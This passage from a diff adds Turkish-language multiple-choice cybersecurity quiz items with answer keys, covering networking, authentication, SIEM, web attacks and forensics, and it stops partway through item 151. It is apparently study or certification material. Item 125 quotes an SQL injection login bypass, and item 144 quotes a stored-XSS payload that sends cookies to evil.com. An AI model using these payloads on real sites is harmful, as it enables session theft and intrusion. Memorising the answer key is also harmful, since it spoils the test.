@@ -1,0 +1,1122 @@
+[
+  {
+    "id": 121,
+    "question": "Bir ağ analistinin tcpdump ile yakaladığı trafikte, kaynak port numarası her bağlantıda farklı ve 1024 üzerinde değişiyor. Hedef port ise sabit 443. Bu durumun açıklaması nedir?",
+    "options": {
+      "A": "Sunucu her bağlantı için farklı HTTPS portu kullanıyor, bu bir güvenlik özelliğidir",
+      "B": "Kaynak port, her oturum için işletim sistemi tarafından rastgele atanan ephemeral porttdur; hedef port sabit servis portudur",
+      "C": "Birden fazla kullanıcı aynı sunucuya bağlandığında port çakışmasını önlemek için firewall port değiştirir",
+      "D": "NAT cihazı kaynak portları otomatik değiştirdiğinden bu davranış yalnızca NAT arkasında görülür"
+    },
+    "correct": "B",
+    "explanation": "Ephemeral (geçici) portlar, istemcinin her bağlantı için işletim sistemi tarafından 1024–65535 arasında rastgele seçilen geçici kaynak portlarıdır. Bağlantı kapandığında serbest bırakılır. Sunucu tarafı sabit (well-known) portu kullanır.",
+    "difficulty": "Orta",
+    "section": "extended"
+  },
+  {
+    "id": 122,
+    "question": "Kerberos kimlik doğrulamasında 'TGT' (Ticket Granting Ticket) alındıktan sonra kullanıcı bir servise erişmek istediğinde hangi adım gerçekleşir?",
+    "options": {
+      "A": "Kullanıcı şifresini doğrudan servise gönderir; servis KDC'ye danışarak doğrular",
+      "B": "TGT ile KDC'nin TGS bileşeninden servis bileti (ST) alınır; bu biletle servise erişilir",
+      "C": "TGT her servise sunulur; servis bunu KDC'ye ileterek doğrular ve erişim verir",
+      "D": "Kullanıcı tekrar kimlik doğrulaması yapar; TGT yalnızca ilk oturumda geçerlidir"
+    },
+    "correct": "B",
+    "explanation": "Kerberos akışı: (1) AS'dan TGT al, (2) TGT ile TGS'den Servis Bileti (ST) al, (3) ST ile servise eriş. Kullanıcı şifresi ağ üzerinden hiç iletilmez.",
+    "difficulty": "Orta",
+    "section": "extended"
+  },
+  {
+    "id": 123,
+    "question": "SHA-256 ile hashlenen iki farklı veri aynı hash değeri üretirse bu durum ne anlama gelir?",
+    "options": {
+      "A": "Bu kasıtlı olarak mümkündür; hash fonksiyonları belirli girdiler için aynı değeri üretecek şekilde tasarlanmıştır",
+      "B": "Bu bir 'collision' (çakışma) durumudur; SHA-256 için hesaplamalı olarak imkânsıza yakındır ve algoritmada kritik bir zayıflık gösterir",
+      "C": "İki veri aynı boyutsa aynı hash üretmesi normaldir; hash boyutu girdi boyutunu belirler",
+      "D": "Collision yalnızca MD5 gibi eski algoritmalarda teorik olarak söz konusudur; SHA ailesinde matematiksel olarak gerçekleşemez"
+    },
+    "correct": "B",
+    "explanation": "Collision, farklı girdilerin aynı hash değeri üretmesidir. MD5 ve SHA-1 için pratikte collision üretilmiştir. SHA-256 için günümüz hesaplama gücüyle bulmak imkânsıza yakındır; böyle bir bulgu algoritmanın kırıldığı anlamına gelir.",
+    "difficulty": "Orta",
+    "section": "extended"
+  },
+  {
+    "id": 124,
+    "question": "RADIUS ile LDAP arasındaki temel işlevsel fark nedir?",
+    "options": {
+      "A": "RADIUS yalnızca şifreli ortamlarda çalışırken LDAP hem şifreli hem şifresiz kullanılabilir",
+      "B": "LDAP bir AAA protokolüdür ve ağ erişimini yönetirken, RADIUS dizin servisi sağlar",
+      "C": "RADIUS ağ erişiminde AAA sağlarken, LDAP kullanıcı/grup bilgilerini merkezi dizinden sorgulayan protokoldür",
+      "D": "Her ikisi de aynı işlevi görür; RADIUS kurumsal, LDAP ise küçük ölçekli ağlar için tercih edilir"
+    },
+    "correct": "C",
+    "explanation": "RADIUS, VPN/Wi-Fi girişlerinde AAA (kimlik doğrulama, yetkilendirme, hesap) sağlar. LDAP ise Active Directory gibi dizin servislerinde kullanıcı ve grup bilgilerini sorgulamak için kullanılır. İkisi sıklıkla birlikte çalışır: RADIUS kimlik doğrularken LDAP'a danışabilir.",
+    "difficulty": "Orta",
+    "section": "extended"
+  },
+  {
+    "id": 125,
+    "question": "Bir web uygulamasında login sayfasına kullanıcı adı alanına `admin'--` yazıldığında sisteme şifresiz girildiği gözlemleniyor. Bu açık nasıl önlenir?",
+    "options": {
+      "A": "Giriş sayfasına CAPTCHA eklenerek bot saldırıları engellenir",
+      "B": "SQL sorgularında parametreli sorgular (prepared statements) ve input validation kullanılarak SQL Injection önlenir",
+      "C": "HTTPS zorunlu kılınarak iletim sırasındaki veri manipülasyonu engellenir",
+      "D": "Hesap kilitleme politikası eklenerek belirli sayıda başarısız denemeden sonra hesap askıya alınır"
+    },
+    "correct": "B",
+    "explanation": "`admin'--` bir SQL Injection payload'udur. Tırnak işareti sorguyu kapatır, `--` ise geriye kalanı yorum satırı yapar; şifre kontrolü atlanır. Prepared statements kullanıcı girdisini kod olarak değil, veri olarak işler ve bu saldırıyı önler.",
+    "difficulty": "Orta",
+    "section": "extended"
+  },
+  {
+    "id": 126,
+    "question": "IPsec'in 'Transport Mode' ile 'Tunnel Mode' arasındaki temel fark nedir?",
+    "options": {
+      "A": "Transport Mode tüm IP paketini şifrelerken, Tunnel Mode yalnızca veri yükünü (payload) şifreler",
+      "B": "Transport Mode yalnızca iki host arasındaki payload'u korurken, Tunnel Mode tüm paketi yeni bir IP başlığıyla kapsülleyerek ağlar arası tünelleme sağlar",
+      "C": "Transport Mode UDP, Tunnel Mode ise TCP üzerinde çalışır",
+      "D": "Transport Mode site-to-site VPN, Tunnel Mode ise remote access VPN için kullanılır"
+    },
+    "correct": "B",
+    "explanation": "Transport Mode: orijinal IP başlığı korunur, yalnızca payload şifrelenir; iki host arasında kullanılır. Tunnel Mode: tüm paket şifrelenerek yeni IP başlığıyla kapsüllenir; iki ağ (site-to-site) arasında VPN tüneli için kullanılır.",
+    "difficulty": "Zor",
+    "section": "extended"
+  },
+  {
+    "id": 127,
+    "question": "Bir güvenlik ekibi SIEM'de şu korelasyon kuralını oluşturmuş: 'Aynı kullanıcı hesabı 1 saat içinde 3 farklı ülkeden giriş yapıyorsa alarm üret.' Bu kural hangi tehdidi öncelikli olarak hedefler?",
+    "options": {
+      "A": "Brute Force saldırılarını; çünkü farklı ülkelerden çok sayıda deneme yapılıyor",
+      "B": "Credential stuffing saldırılarını; çünkü ele geçirilmiş kimlik bilgileri otomatik sistemlerle deneniyor",
+      "C": "Impossible Travel anomalisini; fiziksel olarak imkânsız hızda farklı konumlara erişimi tespit eder ve hesap ele geçirilmesine işaret eder",
+      "D": "DNS Poisoning saldırılarını; çünkü farklı DNS sunucuları üzerinden kimlik doğrulama gerçekleşiyor"
+    },
+    "correct": "C",
+    "explanation": "Impossible Travel, bir kullanıcının fiziksel olarak ulaşamayacağı hızda farklı coğrafi konumlardan giriş yapmasıdır. Örneğin İstanbul'dan 10:00'da, ardından Tokyo'dan 10:30'da giriş — bu durum hesabın ele geçirildiğine güçlü bir işarettir.",
+    "difficulty": "Orta",
+    "section": "extended"
+  },
+  {
+    "id": 128,
+    "question": "nmap ile `-sS` (SYN Scan) yapılırken tam TCP bağlantısı kurulmadan portun açık olduğu nasıl anlaşılır?",
+    "options": {
+      "A": "Hedef ICMP Echo Reply gönderirse port açık sayılır",
+      "B": "Hedef SYN/ACK ile yanıt verirse port açık kabul edilir; nmap ACK göndermeden RST göndererek bağlantıyı tamamlamaz",
+      "C": "Hedef UDP paketiyle yanıt verirse TCP port açık kabul edilir",
+      "D": "Bağlantı zaman aşımına uğramazsa port açık kabul edilir; zaman aşımı kapalı anlamına gelir"
+    },
+    "correct": "B",
+    "explanation": "SYN Scan (yarı açık tarama): nmap SYN gönderir → hedef SYN/ACK ile yanıtlarsa port açık. nmap RST göndererek bağlantıyı tamamlamaz. Kapalı port RST ile, filtrelenmiş port ise sessizce (drop) yanıt verir. Log'larda tam bağlantı kaydı bırakmaz.",
+    "difficulty": "Orta",
+    "section": "extended"
+  },
+  {
+    "id": 129,
+    "question": "Bir saldırgan ARP Spoofing yaparak ağdaki tüm trafiği kendi üzerinden geçiriyor. Ancak HTTPS trafiğinin içeriğini okuyamıyor. Saldırgan bu engeli aşmak için hangi tekniği kullanır?",
+    "options": {
+      "A": "DNS Cache Poisoning ile HTTPS sertifikasını geçersiz kılar",
+      "B": "SSL Stripping ile tarayıcıyı HTTPS yerine HTTP kullanmaya zorlar ve şifrelenmemiş trafiği okur",
+      "C": "VLAN Hopping ile şifrelenmiş trafiğin geçtiği ağ segmentine geçer",
+      "D": "Replay Attack ile daha önce yakaladığı HTTPS paketlerini tekrar oynatır"
+    },
+    "correct": "B",
+    "explanation": "SSL Stripping, saldırganın HTTPS yanıtlarını HTTP'ye dönüştürmesidir. Kullanıcı HTTP üzerinden iletişim kurarken sunucu HTTPS kullandığını sanır. HSTS (HTTP Strict Transport Security) başlığı ve tarayıcı HSTS listeleri bu saldırıya karşı savunma sağlar.",
+    "difficulty": "Zor",
+    "section": "extended"
+  },
+  {
+    "id": 130,
+    "question": "Bir organizasyon 'Runbook' hazırlarken SOAR platformunu kullanıyor. Bu bağlamda Runbook ile Playbook arasındaki fark nedir?",
+    "options": {
+      "A": "Runbook üst düzey stratejiyi, Playbook ise teknik detayları içerir",
+      "B": "Runbook manuel adımları belgelerken, Playbook SOAR'da otomatikleştirilen adım dizisidir; ikisi genellikle eşanlamlı kullanılır ancak Playbook otomasyon bağlamında tercih edilir",
+      "C": "Runbook yalnızca ağ güvenliği, Playbook ise uygulama güvenliği senaryolarını kapsar",
+      "D": "Runbook Blue Team, Playbook ise Red Team için hazırlanır"
+    },
+    "correct": "B",
+    "explanation": "Runbook, güvenlik süreçleri için adım adım kılavuzdur (manuel veya otomatik). Playbook SOAR bağlamında otomasyon akışını tanımlar. Pratikte terminoloji örtüşür; ancak Playbook SOAR'da bir olay tipine karşı otomatik yanıt adımlarını ifade eder.",
+    "difficulty": "Orta",
+    "section": "extended"
+  },
+  {
+    "id": 131,
+    "question": "Wireshark'ta bir pcap dosyasını analiz eden analist, kaynak IP adresi sürekli değişen ancak hedef port 80'e sürekli SYN paketi gönderen trafik görüyor. Bu trafik örüntüsü en muhtemel olarak neyi gösterir?",
+    "options": {
+      "A": "Normal web tarama davranışını; farklı cihazlar aynı web sunucusuna bağlanıyor",
+      "B": "Distributed SYN Flood saldırısını; birden fazla kaynak IP ile hedefe aşırı SYN göndererek TCP bağlantı tablosunu doldurmayı amaçlıyor",
+      "C": "nmap SYN taramasını; tek bir saldırgan kaynak IP'yi spoofing ile değiştirerek tarama yapıyor",
+      "D": "Load balancer davranışını; farklı sunucular aynı hedefe yük dağıtımı için bağlanıyor"
+    },
+    "correct": "B",
+    "explanation": "Çok sayıda kaynak IP'den aynı hedefe yoğun SYN trafiği DDoS SYN Flood işaretidir. Botnet veya IP spoofing ile gerçekleştirilebilir. SYN Cookies bu saldırıya karşı sunucu tarafında etkili bir savunmadır.",
+    "difficulty": "Orta",
+    "section": "extended"
+  },
+  {
+    "id": 132,
+    "question": "LDAP'ta 'Distinguished Name (DN)' kavramı ne anlama gelir?",
+    "options": {
+      "A": "Kullanıcının sisteme giriş şifresidir; hash formatında saklanır",
+      "B": "Dizin ağacında bir nesneyi benzersiz olarak tanımlayan hiyerarşik yol ifadesidir; örneğin 'cn=ahmet,ou=IT,dc=sirket,dc=com'",
+      "C": "LDAP sunucusunun IP adresi ve port kombinasyonunu temsil eden bağlantı dizesidir",
+      "D": "Grup üyeliğini tanımlayan ve erişim yetkilerini belirleyen özel LDAP niteliğidir"
+    },
+    "correct": "B",
+    "explanation": "DN (Distinguished Name), LDAP dizin ağacında bir nesneyi (kullanıcı, grup, bilgisayar) benzersiz olarak tanımlar. Hiyerarşik yapıda okunur: cn (Common Name), ou (Organizational Unit), dc (Domain Component) bileşenlerinden oluşur.",
+    "difficulty": "Orta",
+    "section": "extended"
+  },
+  {
+    "id": 133,
+    "question": "Diffie-Hellman Key Exchange süreci tamamlandıktan sonra oluşturulan 'shared secret' doğrudan veri şifrelemede kullanılmaz. Bunun nedeni nedir?",
+    "options": {
+      "A": "Shared secret asimetrik olduğundan simetrik algoritmalarla uyumlu değildir",
+      "B": "Shared secret matematiksel hesaplamayla elde edildiğinden kriptografik olarak yeterince rastgele (entropy) olmayabilir; KDF ile session key türetilmesi gerekir",
+      "C": "Diffie-Hellman yalnızca anahtar kimlik doğrulaması sağlar, anahtar üretmez",
+      "D": "Shared secret her iki tarafta farklı hesaplandığı için önce eşleştirilmesi gerekir"
+    },
+    "correct": "B",
+    "explanation": "DH shared secret'ı Key Derivation Function (KDF — örn. HKDF) ile işlenerek gerçek session key üretilir. Bu adım hem entropy'yi artırır hem de forward secrecy gibi ek güvenlik özelliklerini mümkün kılar.",
+    "difficulty": "Zor",
+    "section": "extended"
+  },
+  {
+    "id": 134,
+    "question": "Bir penetration tester, hedef sistemde çalışan web uygulamasının HTTP yanıt başlıklarında 'Server: Apache/2.2.14' gördü. Bu bilgi saldırı açısından neden değerlidir?",
+    "options": {
+      "A": "Apache sürümü bilinince uygun encoding formatı seçilerek şifreli trafik daha iyi analiz edilebilir",
+      "B": "Belirli Apache sürümüne ait bilinen CVE'ler araştırılarak hedef versiyona özgü exploit kullanılabilir",
+      "C": "Sunucu yazılımı bilinince hangi programlama dili kullanıldığı ve SQL injection yapılabilip yapılamayacağı anlaşılır",
+      "D": "Web sunucu tipi bilinince hangi port üzerinde çalıştığı ve güvenlik duvarı konfigürasyonu tahmin edilebilir"
+    },
+    "correct": "B",
+    "explanation": "Banner Grabbing ile elde edilen versiyon bilgisi, CVE veritabanlarında o sürüme özgü güvenlik açıklarını aramayı mümkün kılar. Bu nedenle prodüksiyon ortamlarında sunucu başlıklarının gizlenmesi (server version disclosure) önerilir.",
+    "difficulty": "Orta",
+    "section": "extended"
+  },
+  {
+    "id": 135,
+    "question": "Zero Trust modelinde 'Microsegmentation' uygulanmış bir ağda bir endpoint ele geçirildiğinde saldırganın karşılaşacağı temel engel nedir?",
+    "options": {
+      "A": "Ele geçirilen endpoint'in internet bağlantısı otomatik kesilir ve saldırgan C2 sunucusuyla iletişim kuramaz",
+      "B": "Her segment kendi erişim politikasına sahip olduğundan saldırgan yanal harekette (lateral movement) her geçiş için yeniden kimlik doğrulaması ve yetki kontrolüyle karşılaşır",
+      "C": "Microsegmentation şifreli tünel oluşturduğu için saldırgan segment içindeki trafiği dinleyemez",
+      "D": "Her segment ayrı bir güvenlik duvarı kullandığından saldırgan birden fazla firewall'u aşmak zorundadır"
+    },
+    "correct": "B",
+    "explanation": "Microsegmentation'da ağ küçük izole bölümlere ayrılır ve bölgeler arası her trafik politika motoruyla kontrol edilir. Flat network'te bir endpoint'ten tüm ağa erişilebilirken, microsegmentation ile lateral movement her adımda doğrulama gerektirir.",
+    "difficulty": "Zor",
+    "section": "extended"
+  },
+  {
+    "id": 136,
+    "question": "Bir analist `dig @8.8.8.8 example.com +trace` komutunu çalıştırıyor. '+trace' parametresinin farkı nedir?",
+    "options": {
+      "A": "Sorguya ait ağ gecikmesini milisaniye cinsinden ölçerek her DNS sunucusunun yanıt süresini raporlar",
+      "B": "Root sunucularından başlayarak tüm DNS çözümleme zincirini adım adım gösterir; hangi sunucunun neyi devrettiği görülür",
+      "C": "Belirtilen DNS sunucusuna (8.8.8.8) gönderilen paketin içeriğini hex formatında gösterir",
+      "D": "DNS sorgusunu şifreli kanal üzerinden göndererek DNS over HTTPS modunu etkinleştirir"
+    },
+    "correct": "B",
+    "explanation": "+trace, DNS sorgusunu Root sunucularından başlatıp TLD, authoritative nameserver sırasıyla izleyerek tüm delegasyon zincirini gösterir. DNS Poisoning ve misconfiguration tespitinde kritiktir.",
+    "difficulty": "Orta",
+    "section": "extended"
+  },
+  {
+    "id": 137,
+    "question": "WPA2-Personal (PSK) ile WPA2-Enterprise arasındaki en kritik güvenlik farkı nedir?",
+    "options": {
+      "A": "WPA2-Enterprise AES-256 kullanırken WPA2-Personal AES-128 ile şifreler",
+      "B": "WPA2-Personal tüm kullanıcılarla aynı PSK'yı paylaşır; bir kullanıcı ayrılınca anahtar değişmezse diğerlerinin trafiği risk altında kalır. Enterprise ise her kullanıcıya 802.1X/RADIUS üzerinden bireysel kimlik bilgisi sağlar",
+      "C": "WPA2-Enterprise ek donanım gerektirirken WPA2-Personal yazılım tabanlı olduğundan performans avantajı sunar",
+      "D": "WPA2-Personal daha kısa anahtar uzunluğu kullandığından brute force ile kırılabilir, WPA2-Enterprise ise kırılamaz"
+    },
+    "correct": "B",
+    "explanation": "PSK'nın en büyük güvenlik sorunu paylaşılan sırdır. Tüm kullanıcılar aynı anahtarı kullandığından biri ayrılınca ağ güvenliği için anahtar değiştirilmesi gerekir. Enterprise'da her kullanıcının bireysel kimlik bilgisi vardır; bir kullanıcı devre dışı bırakılabilir.",
+    "difficulty": "Orta",
+    "section": "extended"
+  },
+  {
+    "id": 138,
+    "question": "Bir SOC analisti log dosyasında şu girişi görüyor: `sudo: pam_unix(sudo:auth): authentication failure; logname=user1 uid=1001`. Bu log neyi ifade eder ve sonraki adım nedir?",
+    "options": {
+      "A": "Kullanıcı yanlış LDAP şifresi girmiş; domain controller'ı kontrol etmek gerekir",
+      "B": "user1 kullanıcısı sudo komutu çalıştırmaya çalışmış ancak sudo şifresini yanlış girmiş; tek başına alarm gerektirmez ama tekrarı Privilege Escalation girişimine işaret edebilir",
+      "C": "Root hesabına brute force yapılıyor; hesap hemen kilitlenmelidir",
+      "D": "PAM modülü yapılandırma hatası var; sysadmin ile iletişime geçilmeli"
+    },
+    "correct": "B",
+    "explanation": "Bu log, normal bir kullanıcının (uid=1001) sudo ile yetki yükseltmeye çalışırken şifreyi yanlış girmesidir. Tek başına alarm değildir. Ancak kısa aralıklarla çok sayıda tekrar, Privilege Escalation girişiminin veya meşru kullanıcının hesabının ele geçirilmeye çalışıldığının işaretçisidir.",
+    "difficulty": "Orta",
+    "section": "extended"
+  },
+  {
+    "id": 139,
+    "question": "Bir Digital Certificate'in 'Subject Alternative Name (SAN)' alanı ne işe yarar?",
+    "options": {
+      "A": "Sertifikayı imzalayan CA'nın alternatif kimlik bilgilerini içerir",
+      "B": "Tek sertifikanın birden fazla alan adı veya IP adresi için geçerli olmasını sağlar; örneğin hem 'example.com' hem 'www.example.com' için",
+      "C": "Sertifikanın geçerlilik süresinin otomatik uzatılmasında kullanılan yedek alan adını belirtir",
+      "D": "Sertifikanın hangi şifreleme algoritmasıyla imzalandığını ve anahtar uzunluğunu tanımlar"
+    },
+    "correct": "B",
+    "explanation": "SAN, bir sertifikanın birden fazla hostname veya IP adresini kapsamasına olanak tanır. Wildcard sertifikalar (*) yerine veya onunla birlikte kullanılır. Modern tarayıcılar CN (Common Name) yerine SAN'ı kontrol eder.",
+    "difficulty": "Orta",
+    "section": "extended"
+  },
+  {
+    "id": 140,
+    "question": "OWASP Top 10'da 'Insecure Direct Object Reference (IDOR)' hangi kategori altında yer alır ve savunma yöntemi nedir?",
+    "options": {
+      "A": "Injection kategorisi; prepared statements ile önlenir",
+      "B": "Broken Access Control kategorisi; sunucu tarafında her istekte nesneye erişim yetkisi doğrulanmalıdır",
+      "C": "Security Misconfiguration kategorisi; güvenli varsayılan yapılandırma ile önlenir",
+      "D": "Cryptographic Failures kategorisi; nesnelere erişimde şifreli token kullanılmalıdır"
+    },
+    "correct": "B",
+    "explanation": "IDOR, kullanıcının URL veya parametre değerini (örn. ?id=123 → ?id=124) değiştirerek başkasının verilerine ulaşabilmesidir. Broken Access Control kapsamındadır. Savunma: sunucu tarafında her istekte o kullanıcının o nesneye erişim izninin olup olmadığı doğrulanmalıdır.",
+    "difficulty": "Orta",
+    "section": "extended"
+  },
+  {
+    "id": 141,
+    "question": "Bir Blue Team çalışanı, MITRE ATT&CK matrisinde 'T1059.001 — PowerShell' tekniğini gördükten sonra hangi log kaynağını incelemeyi önceliklendirir?",
+    "options": {
+      "A": "Network flow loglarını; PowerShell genellikle C2 iletişimi için ağ bağlantısı açar",
+      "B": "Windows Security Event Log'unu; EventID 4688 yeni process oluşturmayı kaydeder",
+      "C": "Windows PowerShell ve Script Block Logging loglarını; 4103/4104 EventID'leri PowerShell komutlarını kaydeder",
+      "D": "DNS query loglarını; PowerShell saldırıları genellikle DNS tünelleme kullanır"
+    },
+    "correct": "C",
+    "explanation": "ATT&CK T1059.001 için PowerShell Script Block Logging (EventID 4104) ve Module Logging (EventID 4103) etkinleştirilmiş olmalıdır. Bu loglar çalıştırılan PowerShell komutlarının içeriğini kaydeder; obfuscated komutlar dahil.",
+    "difficulty": "Zor",
+    "section": "extended"
+  },
+  {
+    "id": 142,
+    "question": "FTK Imager ile disk imajı alındıktan sonra orijinal cihazda herhangi bir değişiklik yapılmadan hash değeri tekrar hesaplanıyor ve farklı bir hash elde ediliyor. Bu ne anlama gelir?",
+    "options": {
+      "A": "FTK Imager hash hesaplama algoritması değiştiği için sonuç farklı çıkmıştır; bu normaldir",
+      "B": "Orijinal disk imaj alındıktan sonra değiştirilmiş; Chain of Custody ihlali oluşmuş ve delil mahkemede geçersiz sayılabilir",
+      "C": "Hash algoritması disk boyutuna göre farklı sonuç üretir; büyük diskler farklı hash değeri döndürür",
+      "D": "Disk sektörel hasar içerdiğinden aynı disk farklı anlarda farklı hash üretir; bu teknik bir durumdur"
+    },
+    "correct": "B",
+    "explanation": "Hash değeri verinin bütünlüğünü kanıtlar. İmaj alındıktan sonra orijinal cihazın hash'i değişmişse disk değiştirilmiş demektir. Bu, Chain of Custody'yi kırar; mahkemede delil reddedilebilir. İmaj alındığında hem orijinal hem kopyanın hash'i belgelenmelidir.",
+    "difficulty": "Orta",
+    "section": "extended"
+  },
+  {
+    "id": 143,
+    "question": "Aşağıdaki `iptables` kuralını analiz edin: `iptables -A INPUT -p tcp --dport 22 -m conntrack --ctstate NEW -m recent --set --name SSH`. Bu kural ne yapmaktadır?",
+    "options": {
+      "A": "SSH bağlantılarını tamamen engeller ve yeni bağlantıları loglar",
+      "B": "SSH portuna yeni gelen TCP bağlantılarını 'recent' modülüyle izlemeye başlar; genellikle rate limiting zincirinin ilk adımıdır",
+      "C": "SSH trafiğini şifreli bağlantılarla kısıtlar; şifresiz denemeler reddedilir",
+      "D": "Yalnızca belirli IP aralığından gelen SSH bağlantılarına izin verir"
+    },
+    "correct": "B",
+    "explanation": "Bu kural, yeni SSH bağlantılarını 'SSH' adlı recent listesine ekler. Genellikle devamında `--rcheck --seconds 60 --hitcount 4 -j DROP` gibi kural eklenerek 60 saniyede 4'ten fazla deneme yapan IP'ler engellenir — SSH brute force koruması.",
+    "difficulty": "Zor",
+    "section": "extended"
+  },
+  {
+    "id": 144,
+    "question": "Bir saldırgan bir web sitesine `<img src='x' onerror='fetch(\"http://evil.com/\"+document.cookie)'>` içeren yorum ekliyor. Bu saldırı tipi ve etkisi nedir?",
+    "options": {
+      "A": "CSRF saldırısı; kurbanın oturumu kapatılır ve yeniden giriş yapması engellenir",
+      "B": "Stored XSS saldırısı; sayfayı ziyaret eden her kullanıcının session cookie'si saldırgana gönderilir",
+      "C": "Reflected XSS saldırısı; yalnızca bu yorumu yazan kullanıcı etkilenir",
+      "D": "SQL Injection saldırısı; JavaScript kodu veritabanı sorgularına enjekte edilir"
+    },
+    "correct": "B",
+    "explanation": "JavaScript kodu veritabanına kaydedilmişse Stored (Persistent) XSS'tir. Sayfayı açan her kullanıcının tarayıcısında onerror eventi tetiklenir ve cookie saldırgana iletilir. Reflected XSS'te kod URL içinde taşınır ve yalnızca linki tıklayanı etkiler.",
+    "difficulty": "Orta",
+    "section": "extended"
+  },
+  {
+    "id": 145,
+    "question": "Diamond Model'de 'Infrastructure' bileşeni saldırganın özelliklerini değil ne tür bilgileri içerir?",
+    "options": {
+      "A": "Saldırganın teknik yeteneklerini ve kullandığı araçların kaynak kodunu",
+      "B": "C2 sunucuları, ele geçirilmiş sistemler, VPS'ler ve domain adları gibi saldırı operasyonunda kullanılan teknik altyapıyı",
+      "C": "Hedefin sahip olduğu ağ altyapısını ve sistemlerin güvenlik açıklarını",
+      "D": "Saldırının gerçekleştirildiği zaman dilimini ve coğrafi konumunu"
+    },
+    "correct": "B",
+    "explanation": "Diamond Model'de Infrastructure: saldırganın operasyonu için kullandığı teknik kaynakları (IP adresleri, C2 sunucular, alan adları, ele geçirilmiş sistemler) ifade eder. Bu bileşenin izlenmesi diğer saldırı gruplarına ait bağlantıları ortaya çıkarabilir.",
+    "difficulty": "Orta",
+    "section": "extended"
+  },
+  {
+    "id": 146,
+    "question": "Incident Response'un 'Eradication' aşamasında 'root cause analysis' yapılmadan sisteme geri dönülmesi neden risklidir?",
+    "options": {
+      "A": "Kök neden analizi yapılmadan sisteme dönülürse forensic deliller bozulur ve olay raporu tamamlanamaz",
+      "B": "Saldırının giriş noktası kapatılmadan sisteme dönülürse aynı güvenlik açığından tekrar sızılabilir ve olay döngüsel hale gelir",
+      "C": "Kök neden bilinmezse sigorta şirketi hasar tazminatını ödemez; yasal yükümlülükler yerine getirilmemiş olur",
+      "D": "SIEM korelasyon kuralları güncellenemez ve aynı saldırı tekrar alarm üretemez"
+    },
+    "correct": "B",
+    "explanation": "Eradication aşamasının amacı yalnızca zararlı yazılımı temizlemek değil, saldırganın nasıl girdiğini anlamak ve o yolu kapatmaktır. Kök neden (zayıf şifre, yamasız servis, misconfiguration) düzeltilmeden yapılan kurtarma, aynı saldırının tekrarlanmasına zemin hazırlar.",
+    "difficulty": "Orta",
+    "section": "extended"
+  },
+  {
+    "id": 147,
+    "question": "Bir saldırgan hedef şirkete ait GitHub reposunu inceliyor ve bir commit geçmişinde API key buldu. Bu aktivite Kill Chain'ın hangi aşamasına karşılık gelir ve hangi savunma tedbiri bu riski azaltır?",
+    "options": {
+      "A": "Weaponization aşaması; code review süreçlerinin iyileştirilmesi gerekir",
+      "B": "Reconnaissance (OSINT) aşaması; commit geçmişini tarayan araçlar (truffleHog, git-secrets) ve secret scanning politikaları ile önlenir",
+      "C": "Exploitation aşaması; WAF kullanılarak API istekleri filtrelenmelidir",
+      "D": "Delivery aşaması; outbound trafik filtrelemesiyle saldırganın veri çıkarması engellenebilir"
+    },
+    "correct": "B",
+    "explanation": "GitHub/GitLab üzerinden bilgi toplama OSINT tabanlı Reconnaissance'tır. truffleHog, gitleaks gibi araçlar commit geçmişini secret (API key, şifre) için tarar. GitHub'ın yerleşik 'Secret Scanning' özelliği de bu riski azaltır. Commit'e girmiş secret'lar revoke edilmelidir.",
+    "difficulty": "Orta",
+    "section": "extended"
+  },
+  {
+    "id": 148,
+    "question": "tcpdump ile yakalanan bir trafik dosyasını Wireshark'ta analiz ederken TLS trafiğinin şifresini çözmek için ne gerekir?",
+    "options": {
+      "A": "Root CA sertifikası Wireshark'a eklenir; CA sertifikası tüm TLS trafiğini çözebilir",
+      "B": "Sunucunun private key'i veya pre-master secret log dosyası (SSLKEYLOGFILE) Wireshark'a tanıtılmalıdır",
+      "C": "Wireshark Pro lisansı ile TLS şifre çözme özelliği aktifleştirilir",
+      "D": "TLS 1.3 trafiği çözülemez; yalnızca TLS 1.2 ve altı Wireshark tarafından desteklenir"
+    },
+    "correct": "B",
+    "explanation": "Wireshark TLS şifre çözme için sunucunun RSA private key'ini (TLS 1.2, RSA key exchange) veya tarayıcıdan dışarı aktarılan SSLKEYLOGFILE'ı (session keys) kullanır. TLS 1.3 ve ECDHE gibi forward secrecy destekleyen cipher suite'lerde private key yeterli değildir; session key gerekir.",
+    "difficulty": "Zor",
+    "section": "extended"
+  },
+  {
+    "id": 149,
+    "question": "S/MIME ile imzalanmış bir e-posta alındığında alıcı üç şeyi doğrulayabilir. Bunlar nelerdir?",
+    "options": {
+      "A": "Gönderenin IP adresi, e-postanın ne zaman yazıldığı ve içeriğin şifrelenip şifrelenmediği",
+      "B": "Gönderenin kimliği (sertifika ile), mesajın iletim sırasında değiştirilmediği (bütünlük) ve göndericinin gönderdiğini inkâr edemeyeceği (non-repudiation)",
+      "C": "E-postanın spam olmadığı, eklerin virüs içermediği ve başlıkların manipüle edilmediği",
+      "D": "Gönderenin etki alanının DMARC politikasına uyduğu, SPF kaydının geçerli olduğu ve DKIM imzasının eşleştiği"
+    },
+    "correct": "B",
+    "explanation": "S/MIME dijital imzası üç güvenlik özelliği sağlar: (1) Authentication — sertifika ile gönderici kimliği kanıtlanır, (2) Integrity — hash ile içerik değişmediği doğrulanır, (3) Non-repudiation — imza inkâr edilemez. Ayrıca şifreleme eklenirse gizlilik de sağlanır.",
+    "difficulty": "Orta",
+    "section": "extended"
+  },
+  {
+    "id": 150,
+    "question": "Bir organizasyon SOAR platformunda 'Phishing E-posta Tespiti' için playbook oluşturuyor. Otomatik yanıt adımlarının doğru sırası hangisidir?",
+    "options": {
+      "A": "Kullanıcıyı bilgilendir → e-postayı sil → IP'yi engelle → ticket aç → yöneticiye rapor ver",
+      "B": "E-postayı karantinaya al → URL/ekleri sandbox'ta analiz et → IOC'leri çıkar → benzer e-postaları tara ve temizle → ticket aç → kullanıcıyı bilgilendir",
+      "C": "Ticket aç → e-postayı koru → analist bekle → manuel inceleme yap → sonuca göre sil",
+      "D": "Gönderici domain'ini engelle → kullanıcı hesabını kilitle → e-postayı sil → SIEM'e bildir"
+    },
+    "correct": "B",
+    "explanation": "Phishing playbook sırası: önce e-postayı karantinaya al (izole et), içeriği güvenli ortamda analiz et, IOC'leri (IP, URL, hash) çıkar, aynı IOC'leri içeren diğer e-postaları sil, ticket oluştur ve kullanıcıyı farkındalık için bilgilendir.",
+    "difficulty": "Orta",
+    "section": "extended"
+  },
+  {
+    "id": 151,
+    "question": "Threat Hunting sırasında analist, çok sayıda iç sisteme doğru 445 portuna bağlantı denemeleri görüyor ancak bu denemeler başarısız. Bu örüntü en çok neye işaret eder?",
+    "options": {
